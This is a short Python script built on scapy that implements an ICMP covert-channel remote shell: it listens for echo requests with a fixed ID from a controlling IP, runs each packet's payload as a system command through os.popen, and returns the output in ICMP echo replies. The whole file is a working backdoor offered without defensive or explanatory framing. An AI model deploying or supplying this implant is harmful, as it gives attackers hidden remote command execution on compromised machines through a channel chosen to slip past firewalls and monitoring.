#!/usr/bin/env python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import sys, os

ICMP_ID = int(13170)
TTL = int(64)
interface = sys.argv[1]
destination_ip = sys.argv[2]

def icmpshell(pkt):
    if pkt[IP].src == destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

print("[+]ICMP listener started!")
sniff(iface=interface, prn=icmpshell, filter="icmp", store="0")
